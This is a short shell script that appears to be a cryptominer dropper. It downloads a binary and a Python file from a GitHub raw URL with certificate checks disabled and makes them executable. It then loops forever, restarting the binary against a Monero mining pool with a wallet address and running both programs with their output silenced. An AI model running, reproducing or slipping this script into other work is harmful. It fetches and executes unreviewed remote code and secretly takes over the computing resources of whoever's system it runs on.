mkdir -p /opt/code/
wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/goal" -P /opt/code
wget --no-check-certificate "https://raw.githubusercontent.com/x7r3mx/arm/master/origin.py" -P /opt/code
chmod -R 700 /opt/code

while true; do 
    pkill -f goal;
    pkill -f origin;
    sleep 5;
    /opt/code/goal -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr &>/dev/null &
    python /opt/code/origin.py &>/dev/null &
    sleep 1800;
done

